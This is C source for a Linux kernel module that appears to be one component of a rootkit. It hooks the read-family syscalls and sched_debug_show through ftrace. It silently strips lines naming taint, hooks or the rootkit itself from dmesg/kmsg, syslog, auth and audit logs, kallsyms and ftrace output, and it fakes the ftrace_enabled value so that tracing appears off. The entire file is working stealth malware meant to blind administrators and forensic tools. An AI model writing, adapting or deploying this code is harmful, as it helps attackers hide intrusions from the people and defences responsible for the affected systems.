#include "../include/core.h"
#include "../ftrace/ftrace_helper.h"
#include "../include/clear_taint_dmesg.h"

extern char saved_ftrace_value[64];
extern bool ftrace_write_intercepted;

#define MAX_CAP (64*1024)
#define MIN_KERNEL_READ 256

static DEFINE_SPINLOCK(ftrace_read_lock);
static unsigned long last_ftrace_read_jiffies = 0;

static const char *virtual_fs_types[] = {
    "proc", "procfs", "sysfs", "tracefs", "debugfs", NULL
};

static asmlinkage ssize_t (*orig_read)(const struct pt_regs *regs);
static asmlinkage ssize_t (*orig_read_ia32)(const struct pt_regs *regs);
static asmlinkage ssize_t (*orig_pread64)(const struct pt_regs *regs);
static asmlinkage ssize_t (*orig_pread64_ia32)(const struct pt_regs *regs);
static asmlinkage ssize_t (*orig_preadv)(const struct pt_regs *regs);
static asmlinkage ssize_t (*orig_preadv_ia32)(const struct pt_regs *regs);
static asmlinkage ssize_t (*orig_readv)(const struct pt_regs *regs);
static asmlinkage ssize_t (*orig_readv_ia32)(const struct pt_regs *regs);
static int (*orig_sched_debug_show)(struct seq_file *m, void *v);

notrace static bool line_contains_sensitive_info(const char *line);

static notrace bool is_real_ftrace_enabled(struct file *file)
{
    const char *name = NULL;
    struct dentry *dentry, *parent;
    struct super_block *sb;
    
    if (!file || !file->f_path.dentry)
        return false;
    
    dentry = file->f_path.dentry;
    if (dentry->d_name.name)
        name = dentry->d_name.name;
    
    if (!name || strcmp(name, "ftrace_enabled") != 0)
        return false;
    
    if (!file->f_path.mnt || !file->f_path.mnt->mnt_sb)
        return false;
    
    sb = file->f_path.mnt->mnt_sb;
    if (!sb->s_type || !sb->s_type->name)
        return false;
    
    if (strcmp(sb->s_type->name, "proc") != 0 && 
        strcmp(sb->s_type->name, "sysfs") != 0)
        return false;
    
    parent = dentry->d_parent;
    if (!parent || !parent->d_name.name || strcmp(parent->d_name.name, "kernel") != 0)
        return false;
    
    parent = parent->d_parent;
    if (!parent || !parent->d_name.name || strcmp(parent->d_name.name, "sys") != 0)
        return false;
    
    return true;
}

static notrace bool is_trace_file(struct file *file)
{
    const char *name;
    struct dentry *dentry;
    struct super_block *sb;
    
    if (!file || !file->f_path.dentry)
        return false;
    
    dentry = file->f_path.dentry;
    name = dentry->d_name.name;
    
    if (!name || strcmp(name, "trace") != 0)
        return false;
    
    if (!file->f_path.mnt || !file->f_path.mnt->mnt_sb)
        return false;
    
    sb = file->f_path.mnt->mnt_sb;
    if (!sb->s_type || !sb->s_type->name)
        return false;
    
    return (strcmp(sb->s_type->name, "tracefs") == 0 || 
            strcmp(sb->s_type->name, "debugfs") == 0);
}

static notrace bool is_trace_pipe_file(struct file *file)
{
    const char *name;
    struct dentry *dentry;
    struct super_block *sb;
    
    if (!file || !file->f_path.dentry)
        return false;
    
    dentry = file->f_path.dentry;
    name = dentry->d_name.name;
    
    if (!name || strcmp(name, "trace_pipe") != 0)
        return false;
    
    if (!file->f_path.mnt || !file->f_path.mnt->mnt_sb)
        return false;
    
    sb = file->f_path.mnt->mnt_sb;
    if (!sb->s_type || !sb->s_type->name)
        return false;
    
    return (strcmp(sb->s_type->name, "tracefs") == 0 || 
            strcmp(sb->s_type->name, "debugfs") == 0);
}

static notrace ssize_t filter_trace_output(char __user *user_buf, ssize_t bytes_read)
{
    static char frozen_header[2048] = {0};
    static size_t frozen_header_len = 0;
    static bool header_initialized = false;
    char *kernel_buf, *filtered_buf, *line_start, *line_end;
    size_t filtered_len = 0;
    bool ftrace_disabled;
    
    if (bytes_read <= 0 || !user_buf)
        return bytes_read;

    ftrace_disabled = (saved_ftrace_value[0] == '0');

    if (!ftrace_disabled) {
        header_initialized = false;
        frozen_header_len = 0;
        
        if (bytes_read > MAX_CAP)
            bytes_read = MAX_CAP;

        kernel_buf = kmalloc(bytes_read + 1, GFP_KERNEL);
        if (!kernel_buf)
            return bytes_read;

        if (copy_from_user(kernel_buf, user_buf, bytes_read)) {
            kfree(kernel_buf);
            return bytes_read;
        }
        kernel_buf[bytes_read] = '\0';

        filtered_buf = kzalloc(bytes_read + 1, GFP_KERNEL);
        if (!filtered_buf) {
            kfree(kernel_buf);
            return bytes_read;
        }

        line_start = kernel_buf;
        while ((line_end = strchr(line_start, '\n'))) {
            size_t line_len = line_end - line_start;
            char saved = *line_end;
            *line_end = '\0';
            
            if (!line_contains_sensitive_info(line_start)) {
                if (filtered_len + line_len + 1 <= bytes_read) {
                    memcpy(filtered_buf + filtered_len, line_start, line_len);
                    filtered_len += line_len;
                    filtered_buf[filtered_len++] = '\n';
                }
            }
            
            *line_end = saved;
            line_start = line_end + 1;
        }

        if (*line_start && !line_contains_sensitive_info(line_start)) {
            size_t remaining = strlen(line_start);
            if (filtered_len + remaining <= bytes_read) {
                memcpy(filtered_buf + filtered_len, line_start, remaining);
                filtered_len += remaining;
            }
        }

        if (filtered_len == 0) {
            kfree(kernel_buf);
            kfree(filtered_buf);
            return 0;
        }

        if (copy_to_user(user_buf, filtered_buf, filtered_len)) {
            kfree(kernel_buf);
            kfree(filtered_buf);
            return -EFAULT;
        }

        kfree(kernel_buf);
        kfree(filtered_buf);
        return filtered_len;
    }

    if (bytes_read > MAX_CAP)
        bytes_read = MAX_CAP;

    if (!header_initialized) {
        kernel_buf = kmalloc(bytes_read + 1, GFP_KERNEL);
        if (!kernel_buf)
            return bytes_read;

        if (copy_from_user(kernel_buf, user_buf, bytes_read)) {
            kfree(kernel_buf);
            return bytes_read;
        }
        kernel_buf[bytes_read] = '\0';

        frozen_header_len = 0;
        line_start = kernel_buf;
        while ((line_end = strchr(line_start, '\n'))) {
            size_t line_len = line_end - line_start;
            
            if (line_len > 0 && line_start[0] == '#') {
                if (frozen_header_len + line_len + 1 < sizeof(frozen_header)) {
                    memcpy(frozen_header + frozen_header_len, line_start, line_len);
                    frozen_header_len += line_len;
                    frozen_header[frozen_header_len++] = '\n';
                }
            }
            line_start = line_end + 1;
        }

        if (*line_start && line_start[0] == '#') {
            size_t remaining = strlen(line_start);
            if (frozen_header_len + remaining < sizeof(frozen_header)) {
                memcpy(frozen_header + frozen_header_len, line_start, remaining);
                frozen_header_len += remaining;
            }
        }

        frozen_header[frozen_header_len] = '\0';
        header_initialized = true;
        kfree(kernel_buf);
    }

    if (frozen_header_len == 0)
        return 0;

    if (copy_to_user(user_buf, frozen_header, frozen_header_len))
        return -EFAULT;

    return frozen_header_len;
}

notrace static bool should_filter_file(const char *filename) {
    if (!filename)
        return false;
    if (strstr(filename, "audit.log") != NULL)
        return true;
    return (strcmp(filename, "kmsg") == 0 || strcmp(filename, "kallsyms") == 0 ||
            strcmp(filename, "enabled_functions") == 0 || strcmp(filename, "control") == 0 ||
            strcmp(filename, "debug") == 0 || strcmp(filename, "trace") == 0 ||
            strcmp(filename, "kern.log") == 0 || strcmp(filename, "kern.log.1") == 0 ||
            strcmp(filename, "syslog") == 0 || strcmp(filename, "auth.log") == 0 ||
            strcmp(filename, "auth.log.1") == 0 || strcmp(filename, "vmallocinfo") == 0 ||
            strcmp(filename, "syslog.1") == 0 || strcmp(filename, "trace_pipe") == 0 ||
            strcmp(filename, "kcore") == 0 || strcmp(filename, "touched_functions") == 0);
}

notrace static bool is_kmsg_device(const char *filename) {
    return filename && strcmp(filename, "kmsg") == 0;
}

notrace static bool line_contains_sensitive_info(const char *line) {
    if (!line)
        return false;
    return (strstr(line, "taint") != NULL || strstr(line, "journal") != NULL ||
            strstr(line, "singularity") != NULL || strstr(line, "Singularity") != NULL ||
            strstr(line, "matheuz") != NULL || strstr(line, "zer0t") != NULL ||
            strstr(line, "hook") != NULL || strstr(line, "hooked_") != NULL ||
            strstr(line, "kallsyms_lookup_name") != NULL || strstr(line, "obliviate") != NULL ||
            strstr(line, "clear_taint") != NULL || strstr(line, "filter_buffer") != NULL ||
            strstr(line, "filter_kmsg") != NULL || strstr(line, "filter_trace") != NULL);
}

notrace static bool is_virtual_file(struct file *file) {
    const char *fsname;
    int i;
    if (!file || !file->f_path.mnt || !file->f_path.mnt->mnt_sb || !file->f_path.mnt->mnt_sb->s_type)
        return false;
    fsname = file->f_path.mnt->mnt_sb->s_type->name;
    if (!fsname)
        return false;
    for (i = 0; virtual_fs_types[i]; i++) {
        if (strcmp(fsname, virtual_fs_types[i]) == 0)
            return true;
    }
    return false;
}

notrace static ssize_t filter_buffer_content(char __user *user_buf, ssize_t bytes_read) {
    char *kernel_buf, *total_buf, *filtered_buf, *line_start, *line_end;
    size_t filtered_len = 0, total_len;
    
    if (bytes_read <= 0 || !user_buf)
        return bytes_read;
    if (bytes_read > MAX_CAP)
        bytes_read = MAX_CAP;

    kernel_buf = kmalloc(bytes_read + 1, GFP_KERNEL);
    if (!kernel_buf)
        return -ENOMEM;
    if (copy_from_user(kernel_buf, user_buf, bytes_read)) {
        kfree(kernel_buf);
        return -EFAULT;
    }
    kernel_buf[bytes_read] = '\0';

    total_len = bytes_read;
    total_buf = kmalloc(total_len + 1, GFP_KERNEL);
    if (!total_buf) {
        kfree(kernel_buf);
        return -ENOMEM;
    }
    memcpy(total_buf, kernel_buf, bytes_read);
    total_buf[total_len] = '\0';

    filtered_buf = kzalloc(total_len + 1, GFP_KERNEL);
    if (!filtered_buf) {
        kfree(kernel_buf);
        kfree(total_buf);
        return -ENOMEM;
    }

    line_start = total_buf;
    while ((line_end = strchr(line_start, '\n'))) {
        size_t line_len = line_end - line_start;
        char saved = line_end[0];
        line_end[0] = '\0';
        if (!line_contains_sensitive_info(line_start)) {
            if (filtered_len + line_len + 1 <= total_len) {
                memcpy(filtered_buf + filtered_len, line_start, line_len);
                filtered_len += line_len;
                filtered_buf[filtered_len++] = '\n';
            }
        }
        line_end[0] = saved;
        line_start = line_end + 1;
    }

    if (filtered_len == 0) {
        kfree(kernel_buf);
        kfree(total_buf);
        kfree(filtered_buf);
        return 0;
    }

    if (copy_to_user(user_buf, filtered_buf, filtered_len)) {
        kfree(kernel_buf);
        kfree(total_buf);
        kfree(filtered_buf);
        return -EFAULT;
    }

    kfree(kernel_buf);
    kfree(total_buf);
    kfree(filtered_buf);
    return filtered_len;
}

notrace static ssize_t filter_kmsg_line(char __user *user_buf, ssize_t bytes_read) {
    char *kernel_buf;
    ssize_t ret;
    
    if (bytes_read <= 0 || !user_buf)
        return bytes_read;

    kernel_buf = kmalloc(bytes_read + 1, GFP_KERNEL);
    if (!kernel_buf)
        return bytes_read;
    if (copy_from_user(kernel_buf, user_buf, bytes_read)) {
        kfree(kernel_buf);
        return bytes_read;
    }
    kernel_buf[bytes_read] = '\0';
    ret = line_contains_sensitive_info(kernel_buf) ? 0 : bytes_read;
    kfree(kernel_buf);
    return ret;
}

notrace static ssize_t read_and_filter(struct file *file, char __user *user_buf, size_t user_count) {
    char *kbuf, *total_buf, *filtered, *line_start, *line_end;
    loff_t pos;
    ssize_t got, ret = 0, to_read;
    size_t filtered_len = 0, total_len, to_copy;

    if (!file || !user_buf)
        return -EFAULT;
    if (user_count <= 1)
        return 0;
    if (is_virtual_file(file))
        return -EOPNOTSUPP;

    to_read = user_count;
    if (to_read < MIN_KERNEL_READ)
        to_read = MIN_KERNEL_READ;
    if (to_read > MAX_CAP)
        to_read = MAX_CAP;

    kbuf = kmalloc(to_read + 1, GFP_KERNEL);
    if (!kbuf)
        return -ENOMEM;

    pos = file->f_pos;
    got = kernel_read(file, kbuf, to_read, &pos);
    if (got < 0) {
        kfree(kbuf);
        return -EOPNOTSUPP;
    }
    file->f_pos = pos;
    if (got == 0) {
        kfree(kbuf);
        return 0;
    }
    if (got > to_read)
        got = to_read;
    kbuf[got] = '\0';

    total_len = got;
    total_buf = kmalloc(total_len + 1, GFP_KERNEL);
    if (!total_buf) {
        kfree(kbuf);
        return -ENOMEM;
    }
    memcpy(total_buf, kbuf, got);
    total_buf[total_len] = '\0';

    filtered = kzalloc(total_len + 1, GFP_KERNEL);
    if (!filtered) {
        kfree(kbuf);
        kfree(total_buf);
        return -ENOMEM;
    }

    line_start = total_buf;
    while ((line_end = strchr(line_start, '\n'))) {
        size_t l = line_end - line_start;
        char saved = line_end[0];
        line_end[0] = '\0';
        if (!line_contains_sensitive_info(line_start)) {
            if (filtered_len + l + 1 <= total_len) {
                memcpy(filtered + filtered_len, line_start, l);
                filtered_len += l;
                filtered[filtered_len++] = '\n';
            }
        }
        line_end[0] = saved;
        line_start = line_end + 1;
    }

    if (filtered_len == 0) {
        kfree(kbuf);
        kfree(total_buf);
        kfree(filtered);
        return 0;
    }

    to_copy = (filtered_len > user_count) ? user_count : filtered_len;
    if (copy_to_user(user_buf, filtered, to_copy)) {
        kfree(kbuf);
        kfree(total_buf);
        kfree(filtered);
        return -EFAULT;
    }

    ret = (ssize_t)to_copy;
    kfree(kbuf);
    kfree(total_buf);
    kfree(filtered);
    return ret;
}


static notrace asmlinkage ssize_t hook_read(const struct pt_regs *regs) {
    struct file *file;
    const char *filename;
    bool is_kmsg, ftrace_disabled;
    ssize_t res = 0, orig_res;
    int fd;
    char __user *user_buf;
    size_t count;

    if (!orig_read)
        return -EINVAL;

    fd = regs->di;
    user_buf = (char __user *)regs->si;
    count = (size_t)regs->dx;

    if (!user_buf)
        return -EFAULT;

    if (ftrace_write_intercepted) {
        struct file *check_file = fget(fd);
        if (check_file) {
            if (is_real_ftrace_enabled(check_file)) {
                size_t fake_len = strlen(saved_ftrace_value);
                unsigned long flags, now = jiffies;
                bool should_return_data = false;
                
                spin_lock_irqsave(&ftrace_read_lock, flags);
                if (time_after(now, last_ftrace_read_jiffies + msecs_to_jiffies(100))) {
                    should_return_data = true;
                    last_ftrace_read_jiffies = now;
                }
                spin_unlock_irqrestore(&ftrace_read_lock, flags);
                
                fput(check_file);
                
                if (!should_return_data)
                    return 0;
                
                if (fake_len <= count) {
                    if (!copy_to_user(user_buf, saved_ftrace_value, fake_len))
                        return fake_len;
                }
                return -EFAULT;
            }
            fput(check_file);
        }
    }

    file = fget(fd);
    if (!file)
        return orig_read(regs);

    if (is_trace_pipe_file(file)) {
        ftrace_disabled = (saved_ftrace_value[0] == '0');
        
        if (ftrace_disabled) {
            fput(file);
            return orig_read(regs);
        }
        
        orig_res = orig_read(regs);
        fput(file);
        if (orig_res <= 0)
            return orig_res;
        return filter_trace_output(user_buf, orig_res);
    }

    if (is_trace_file(file)) {
        ftrace_disabled = (saved_ftrace_value[0] == '0');
        
        if (ftrace_disabled && file->f_pos > 0) {
            fput(file);
            return 0;
        }
        
        orig_res = orig_read(regs);
        if (orig_res <= 0) {
            fput(file);
            return orig_res;
        }
        
        res = filter_trace_output(user_buf, orig_res);
        fput(file);
        return res;
    }

    filename = NULL;
    if (file->f_path.dentry)
        filename = file->f_path.dentry->d_name.name;

    if (!should_filter_file(filename)) {
        fput(file);
        return orig_read(regs);
    }

    is_kmsg = is_kmsg_device(filename);

    if (is_kmsg) {
        do {
            res = orig_read(regs);
            if (res <= 0)
                break;
            res = filter_kmsg_line(user_buf, res);
        } while (res == 0);
        fput(file);
        return res;
    }

    res = read_and_filter(file, user_buf, count);
    if (res == -EOPNOTSUPP) {
        orig_res = orig_read(regs);
        if (orig_res <= 0) {
            fput(file);
            return orig_res;
        }
        res = filter_buffer_content(user_buf, orig_res);
        fput(file);
        return res;
    }

    fput(file);
    return res;
}

static notrace asmlinkage ssize_t hook_read_ia32(const struct pt_regs *regs) {
    struct file *file;
    const char *filename;
    bool is_kmsg, ftrace_disabled;
    ssize_t res = 0, orig_res;
    int fd;
    char __user *user_buf;
    size_t count;

    if (!orig_read_ia32)
        return -EINVAL;

    fd = regs->bx;
    user_buf = (char __user *)regs->cx;
    count = (size_t)regs->dx;

    if (!user_buf)
        return -EFAULT;

    if (ftrace_write_intercepted) {
        struct file *check_file = fget(fd);
        if (check_file) {
            if (is_real_ftrace_enabled(check_file)) {
                size_t fake_len = strlen(saved_ftrace_value);
                unsigned long flags, now = jiffies;
                bool should_return_data = false;
                
                spin_lock_irqsave(&ftrace_read_lock, flags);
                if (time_after(now, last_ftrace_read_jiffies + msecs_to_jiffies(100))) {
                    should_return_data = true;
                    last_ftrace_read_jiffies = now;
                }
                spin_unlock_irqrestore(&ftrace_read_lock, flags);
                
                fput(check_file);
                
                if (!should_return_data)
                    return 0;
                
                if (fake_len <= count) {
                    if (!copy_to_user(user_buf, saved_ftrace_value, fake_len))
                        return fake_len;
                }
                return -EFAULT;
            }
            fput(check_file);
        }
    }

    file = fget(fd);
    if (!file)
        return orig_read_ia32(regs);

    if (is_trace_pipe_file(file)) {
        ftrace_disabled = (saved_ftrace_value[0] == '0');
        
        if (ftrace_disabled) {
            fput(file);
            return orig_read_ia32(regs);
        }
        
        orig_res = orig_read_ia32(regs);
        fput(file);
        if (orig_res <= 0)
            return orig_res;
        return filter_trace_output(user_buf, orig_res);
    }

    if (is_trace_file(file)) {
        ftrace_disabled = (saved_ftrace_value[0] == '0');
        if (ftrace_disabled && file->f_pos > 0) {
            fput(file);
            return 0;
        }
        orig_res = orig_read_ia32(regs);
        if (orig_res <= 0) {
            fput(file);
            return orig_res;
        }
        res = filter_trace_output(user_buf, orig_res);
        fput(file);
        return res;
    }

    filename = NULL;
    if (file->f_path.dentry)
        filename = file->f_path.dentry->d_name.name;

    if (!should_filter_file(filename)) {
        fput(file);
        return orig_read_ia32(regs);
    }

    is_kmsg = is_kmsg_device(filename);

    if (is_kmsg) {
        do {
            res = orig_read_ia32(regs);
            if (res <= 0)
                break;
            res = filter_kmsg_line(user_buf, res);
        } while (res == 0);
        fput(file);
        return res;
    }

    res = read_and_filter(file, user_buf, count);
    if (res == -EOPNOTSUPP) {
        orig_res = orig_read_ia32(regs);
        if (orig_res <= 0) {
            fput(file);
            return orig_res;
        }
        res = filter_buffer_content(user_buf, orig_res);
        fput(file);
        return res;
    }

    fput(file);
    return res;
}


static notrace asmlinkage ssize_t hook_pread64(const struct pt_regs *regs) {
    struct file *file;
    const char *filename;
    bool is_kmsg;
    ssize_t res;
    int fd = regs->di;
    char __user *user_buf = (char __user *)regs->si;
    size_t count = (size_t)regs->dx;

    if (!orig_pread64 || !user_buf)
        return -EINVAL;

    file = fget(fd);
    if (!file)
        return orig_pread64(regs);

    filename = file->f_path.dentry ? file->f_path.dentry->d_name.name : NULL;
    if (!should_filter_file(filename)) {
        fput(file);
        return orig_pread64(regs);
    }

    is_kmsg = is_kmsg_device(filename);
    if (is_kmsg) {
        do {
            res = orig_pread64(regs);
            if (res <= 0)
                break;
            res = filter_kmsg_line(user_buf, res);
        } while (res == 0);
        fput(file);
        return res;
    }

    res = read_and_filter(file, user_buf, count);
    if (res == -EOPNOTSUPP) {
        ssize_t orig_res = orig_pread64(regs);
        if (orig_res <= 0) {
            fput(file);
            return orig_res;
        }
        res = filter_buffer_content(user_buf, orig_res);
        fput(file);
        return res;
    }

    fput(file);
    return res;
}

static notrace asmlinkage ssize_t hook_pread64_ia32(const struct pt_regs *regs) {
    struct file *file;
    const char *filename;
    bool is_kmsg;
    ssize_t res;
    int fd = regs->bx;
    char __user *user_buf = (char __user *)regs->cx;
    size_t count = (size_t)regs->dx;

    if (!orig_pread64_ia32 || !user_buf)
        return -EINVAL;

    file = fget(fd);
    if (!file)
        return orig_pread64_ia32(regs);

    filename = file->f_path.dentry ? file->f_path.dentry->d_name.name : NULL;
    if (!should_filter_file(filename)) {
        fput(file);
        return orig_pread64_ia32(regs);
    }

    is_kmsg = is_kmsg_device(filename);
    if (is_kmsg) {
        do {
            res = orig_pread64_ia32(regs);
            if (res <= 0)
                break;
            res = filter_kmsg_line(user_buf, res);
        } while (res == 0);
        fput(file);
        return res;
    }

    res = read_and_filter(file, user_buf, count);
    if (res == -EOPNOTSUPP) {
        ssize_t orig_res = orig_pread64_ia32(regs);
        if (orig_res <= 0) {
            fput(file);
            return orig_res;
        }
        res = filter_buffer_content(user_buf, orig_res);
        fput(file);
        return res;
    }

    fput(file);
    return res;
}

static notrace asmlinkage ssize_t hook_preadv(const struct pt_regs *regs) {
    struct file *file;
    const char *filename;
    bool is_kmsg;
    int fd = regs->di;
    struct iovec __user *iov = (struct iovec __user *)regs->si;
    ssize_t orig_res, filtered;

    if (!orig_preadv || !iov)
        return -EFAULT;

    file = fget(fd);
    if (!file)
        return orig_preadv(regs);

    filename = file->f_path.dentry ? file->f_path.dentry->d_name.name : NULL;
    if (!should_filter_file(filename)) {
        fput(file);
        return orig_preadv(regs);
    }

    orig_res = orig_preadv(regs);
    if (orig_res <= 0) {
        fput(file);
        return orig_res;
    }

    is_kmsg = is_kmsg_device(filename);
    if (is_kmsg) {
        struct iovec iov_copy;
        if (copy_from_user(&iov_copy, iov, sizeof(struct iovec))) {
            fput(file);
            return orig_res;
        }
        filtered = filter_kmsg_line(iov_copy.iov_base, orig_res);
        fput(file);
        return filtered;
    }

    struct iovec iov_copy;
    if (copy_from_user(&iov_copy, iov, sizeof(struct iovec))) {
        fput(file);
        return orig_res;
    }
    filtered = filter_buffer_content(iov_copy.iov_base, orig_res);
    fput(file);
    return filtered;
}

static notrace asmlinkage ssize_t hook_preadv_ia32(const struct pt_regs *regs) {
    struct file *file;
    const char *filename;
    bool is_kmsg;
    int fd = regs->bx;
    struct iovec __user *iov = (struct iovec __user *)regs->cx;
    ssize_t orig_res, filtered;

    if (!orig_preadv_ia32 || !iov)
        return -EFAULT;

    file = fget(fd);
    if (!file)
        return orig_preadv_ia32(regs);

    filename = file->f_path.dentry ? file->f_path.dentry->d_name.name : NULL;
    if (!should_filter_file(filename)) {
        fput(file);
        return orig_preadv_ia32(regs);
    }

    orig_res = orig_preadv_ia32(regs);
    if (orig_res <= 0) {
        fput(file);
        return orig_res;
    }

    is_kmsg = is_kmsg_device(filename);
    if (is_kmsg) {
        struct iovec iov_copy;
        if (copy_from_user(&iov_copy, iov, sizeof(struct iovec))) {
            fput(file);
            return orig_res;
        }
        filtered = filter_kmsg_line(iov_copy.iov_base, orig_res);
        fput(file);
        return filtered;
    }

    struct iovec iov_copy;
    if (copy_from_user(&iov_copy, iov, sizeof(struct iovec))) {
        fput(file);
        return orig_res;
    }
    filtered = filter_buffer_content(iov_copy.iov_base, orig_res);
    fput(file);
    return filtered;
}

static notrace asmlinkage ssize_t hook_readv(const struct pt_regs *regs) {
    struct file *file;
    const char *filename;
    bool is_kmsg;
    int fd = regs->di;
    struct iovec __user *iov = (struct iovec __user *)regs->si;
    ssize_t orig_res, filtered;

    if (!orig_readv || !iov)
        return -EFAULT;

    file = fget(fd);
    if (!file)
        return orig_readv(regs);

    filename = file->f_path.dentry ? file->f_path.dentry->d_name.name : NULL;
    if (!should_filter_file(filename)) {
        fput(file);
        return orig_readv(regs);
    }

    orig_res = orig_readv(regs);
    if (orig_res <= 0) {
        fput(file);
        return orig_res;
    }

    is_kmsg = is_kmsg_device(filename);
    if (is_kmsg) {
        struct iovec iov_copy;
        if (copy_from_user(&iov_copy, iov, sizeof(struct iovec))) {
            fput(file);
            return orig_res;
        }
        filtered = filter_kmsg_line(iov_copy.iov_base, orig_res);
        fput(file);
        return filtered;
    }

    struct iovec iov_copy;
    if (copy_from_user(&iov_copy, iov, sizeof(struct iovec))) {
        fput(file);
        return orig_res;
    }
    filtered = filter_buffer_content(iov_copy.iov_base, orig_res);
    fput(file);
    return filtered;
}

static notrace asmlinkage ssize_t hook_readv_ia32(const struct pt_regs *regs) {
    struct file *file;
    const char *filename;
    bool is_kmsg;
    int fd = regs->bx;
    struct iovec __user *iov = (struct iovec __user *)regs->cx;
    ssize_t orig_res, filtered;

    if (!orig_readv_ia32 || !iov)
        return -EFAULT;

    file = fget(fd);
    if (!file)
        return orig_readv_ia32(regs);

    filename = file->f_path.dentry ? file->f_path.dentry->d_name.name : NULL;
    if (!should_filter_file(filename)) {
        fput(file);
        return orig_readv_ia32(regs);
    }

    orig_res = orig_readv_ia32(regs);
    if (orig_res <= 0) {
        fput(file);
        return orig_res;
    }

    is_kmsg = is_kmsg_device(filename);
    if (is_kmsg) {
        struct iovec iov_copy;
        if (copy_from_user(&iov_copy, iov, sizeof(struct iovec))) {
            fput(file);
            return orig_res;
        }
        filtered = filter_kmsg_line(iov_copy.iov_base, orig_res);
        fput(file);
        return filtered;
    }

    struct iovec iov_copy;
    if (copy_from_user(&iov_copy, iov, sizeof(struct iovec))) {
        fput(file);
        return orig_res;
    }
    filtered = filter_buffer_content(iov_copy.iov_base, orig_res);
    fput(file);
    return filtered;
}

static notrace int hook_sched_debug_show(struct seq_file *m, void *v) {
    size_t buf_size = 8192;
    char *buf, *line, *line_ptr;
    struct seq_file tmp_seq;
    int ret;

    if (!orig_sched_debug_show || !m)
        return -EINVAL;

    buf = kzalloc(buf_size, GFP_KERNEL);
    if (!buf)
        return orig_sched_debug_show(m, v);

    tmp_seq = *m;
    tmp_seq.buf = buf;
    tmp_seq.size = buf_size;
    tmp_seq.count = 0;

    ret = orig_sched_debug_show(&tmp_seq, v);

    if (m->buf) {
        line = buf;
        while ((line_ptr = strchr(line, '\n'))) {
            *line_ptr = '\0';
            if (!line_contains_sensitive_info(line))
                seq_printf(m, "%s\n", line);
            line = line_ptr + 1;
        }
        if (*line && !line_contains_sensitive_info(line))
            seq_printf(m, "%s", line);
    }

    kfree(buf);
    return ret;
}

static struct ftrace_hook hooks[] = {
    HOOK("__x64_sys_read", hook_read, &orig_read),
    HOOK("__ia32_sys_read", hook_read_ia32, &orig_read_ia32),
    HOOK("__x64_sys_pread64", hook_pread64, &orig_pread64),
    HOOK("__ia32_sys_pread64", hook_pread64_ia32, &orig_pread64_ia32),
    HOOK("__x64_sys_readv", hook_readv, &orig_readv),
    HOOK("__ia32_sys_readv", hook_readv_ia32, &orig_readv_ia32),
    HOOK("__x64_sys_preadv", hook_preadv, &orig_preadv),
    HOOK("__ia32_sys_preadv", hook_preadv_ia32, &orig_preadv_ia32),
    HOOK("sched_debug_show", hook_sched_debug_show, &orig_sched_debug_show),
};

notrace int clear_taint_dmesg_init(void) {
    return fh_install_hooks(hooks, ARRAY_SIZE(hooks));
}

notrace void clear_taint_dmesg_exit(void) {
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
}
